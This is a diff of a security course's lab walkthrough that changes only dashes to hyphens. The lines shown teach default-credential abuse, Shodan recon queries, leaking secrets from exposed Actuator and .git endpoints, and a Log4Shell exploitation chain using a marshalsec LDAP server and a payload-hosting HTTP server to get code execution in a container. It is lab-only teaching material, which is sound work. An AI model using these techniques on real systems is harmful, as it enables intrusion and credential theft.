@@ -1,4 +1,4 @@
-# Week 14: Attack walkthrough — Security Misconfiguration & Vulnerable Components
+# Week 14: Attack walkthrough - Security Misconfiguration & Vulnerable Components
 
 > ⚠️ **Lab only.**
 
@@ -6,7 +6,7 @@
 
 ## The framing
 
-Most of this week's bugs aren't "code-level vulnerabilities" — they're operational ones. A perfectly written Spring Boot service running on a Tomcat with `admin:admin` console access is wide-open. A perfectly architected API behind a perfectly configured load balancer with `DEBUG=True` in production leaks env vars. The patterns are obvious in hindsight; the work is making sure they don't pile up.
+Most of this week's bugs aren't "code-level vulnerabilities" - they're operational ones. A perfectly written Spring Boot service running on a Tomcat with `admin:admin` console access is wide-open. A perfectly architected API behind a perfectly configured load balancer with `DEBUG=True` in production leaks env vars. The patterns are obvious in hindsight; the work is making sure they don't pile up.
 
 ## Part 1: Default credentials
 
@@ -19,7 +19,7 @@ A piece of software ships with a default account so the operator can log in for 
 | Component | Default creds | Where to look |
 |---|---|---|
 | Tomcat Manager | `admin:admin`, `tomcat:tomcat`, `admin:password` | `/manager/html` |
-| Jenkins | None by default (newer) — but older installs had open `/script` | `/script` |
+| Jenkins | None by default (newer) - but older installs had open `/script` | `/script` |
 | GitLab admin | `root:5iveL!fe` (pre-config) | `/users/sign_in` |
 | Grafana | `admin:admin` | `/login` |
 | MongoDB | No auth by default *if bound publicly* (pre-3.6 listened on 0.0.0.0; modern containers still bypass this if started with `-p 27017:27017`) | port 27017 |
@@ -31,7 +31,7 @@ A piece of software ships with a default account so the operator can log in for 
 | FTP servers | `anonymous`, `admin:admin` | port 21 |
 | Network appliances (routers, switches) | `admin:admin`, vendor-doc creds | management interface |
 
-The famous CVEs in this category aren't "code" CVEs — they're vendor-doc credentials and shodan.io.
+The famous CVEs in this category aren't "code" CVEs - they're vendor-doc credentials and shodan.io.
 
 ### Step 1: Recon
 
@@ -76,7 +76,7 @@ elasticsearch port:9200
 "X-Jenkins" "X-Hudson" port:8080
 ```
 
-Return tens of thousands of exposed instances at any given moment. Authorized engagements use Shodan as recon; unauthorized ones use it for opportunistic compromise. **Looking at Shodan results for an organization you don't own is not authorized testing — it's reconnaissance for the kind of attack we're not teaching.**
+Return tens of thousands of exposed instances at any given moment. Authorized engagements use Shodan as recon; unauthorized ones use it for opportunistic compromise. **Looking at Shodan results for an organization you don't own is not authorized testing - it's reconnaissance for the kind of attack we're not teaching.**
 
 ## Part 2: Verbose error messages & debug pages
 
@@ -129,7 +129,7 @@ Spring Boot Actuator deserves a paragraph. If the operator exposes the `env` end
 
 ```bash
 curl http://target/actuator/env
-# returns ALL environment variables — JDBC URLs, API keys, ...
+# returns ALL environment variables - JDBC URLs, API keys, ...
 ```
 
 And if `heapdump` is exposed:
@@ -173,7 +173,7 @@ git log -p --all | grep -i "todo\|fixme\|hack\|password\|key"
 
 When you've cloned via the `.git` exposure or via the published GitHub repo, the diff history often contains accidentally-committed-then-removed secrets (Week 10).
 
-## Part 3: Vulnerable component — Log4Shell walkthrough
+## Part 3: Vulnerable component - Log4Shell walkthrough
 
 CVE-2021-44228. The single most consequential application-security incident of the 2020s. It's the canonical "an unpatched library is RCE" lesson.
 
@@ -185,7 +185,7 @@ Log4j's pattern syntax included `${jndi:...}` substitutions. If user input was l
 
 ```bash
 curl -A "test" http://localhost:8080/
-# expect a 200 — the app logs the User-Agent
+# expect a 200 - the app logs the User-Agent
 ```
 
 ### Step 2: Stand up the attacker JNDI/LDAP server
@@ -200,7 +200,7 @@ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
   marshalsec.jndi.LDAPRefServer "http://host.docker.internal:8888/#Exploit"
 ```
 
-This LDAP server responds to lookups by saying "go fetch the class `Exploit` from `http://host.docker.internal:8888/`" — a URL the container can resolve back to your host.
+This LDAP server responds to lookups by saying "go fetch the class `Exploit` from `http://host.docker.internal:8888/`" - a URL the container can resolve back to your host.
 
 ### Step 3: Stand up the HTTP server hosting the payload class
 
@@ -231,7 +231,7 @@ python3 -m http.server 8888
 
 ### Step 4: Trigger
 
-The vulnerable app runs **inside a container**, so from its perspective `localhost` is the container itself — your host's marshalsec LDAP and HTTP server are not reachable as `localhost`. Use one of:
+The vulnerable app runs **inside a container**, so from its perspective `localhost` is the container itself - your host's marshalsec LDAP and HTTP server are not reachable as `localhost`. Use one of:
 
 - **Docker Desktop (Mac/Windows):** the magic hostname `host.docker.internal` resolves to the host.
 - **Linux:** either run the container with `--network host` (so `localhost` actually means the host) **or** find the bridge gateway via `docker inspect vuln-app --format '{{(index .NetworkSettings.Networks "bridge").Gateway}}'` (typically `172.17.0.1`) and use that IP.
@@ -272,10 +272,10 @@ You have RCE inside the container.
 
 ### Why was this a 10/10 incident?
 
-- Log4j is the de facto Java logging library — millions of services included it.
-- The trigger string fit in any logged field — User-Agent, X-Forwarded-For, username, search input, email, hostname seen by a SaaS form.
+- Log4j is the de facto Java logging library - millions of services included it.
+- The trigger string fit in any logged field - User-Agent, X-Forwarded-For, username, search input, email, hostname seen by a SaaS form.
 - The exploit was a single string. No exploit kit. No deobfuscation. Any 2-line Python script could spray the internet.
-- The class of attack — RCE via logging — was not in anyone's threat model.
+- The class of attack - RCE via logging - was not in anyone's threat model.
 
 ### Step 5: Bypasses that emerged in the following weeks
 
@@ -292,7 +292,7 @@ A Software Bill of Materials lists every component (direct + transitive) your so
 ### Generate one
 
 ```bash
-# Syft — supports basically every ecosystem
+# Syft - supports basically every ecosystem
 syft your-app:latest -o cyclonedx-json > sbom.json
 
 # In Python:
@@ -312,7 +312,7 @@ When the next Log4Shell drops:
 2. You search every SBOM in your org for that range.
 3. You patch only what's actually affected.
 
-Without SBOMs, the response to "we use Log4j somewhere" is "let's grep our codebase" — which misses transitive deps, embedded JARs, Docker base images. **The first 72 hours of Log4Shell were spent by ~every company finding out where Log4j was inside their stack.** Companies with current SBOMs found everything in an hour.
+Without SBOMs, the response to "we use Log4j somewhere" is "let's grep our codebase" - which misses transitive deps, embedded JARs, Docker base images. **The first 72 hours of Log4Shell were spent by ~every company finding out where Log4j was inside their stack.** Companies with current SBOMs found everything in an hour.
 
 ### Step: scan for known CVEs
 
@@ -333,7 +333,7 @@ openssl 1.1.1k     CVE-2022-0778   HIGH
 
 ## Part 5: Other misconfig variants
 
-### CORS misconfig (Week 09 — repeated here because it's discovered as misconfig in practice)
+### CORS misconfig (Week 09 - repeated here because it's discovered as misconfig in practice)
 
 ```http
 Access-Control-Allow-Origin: *
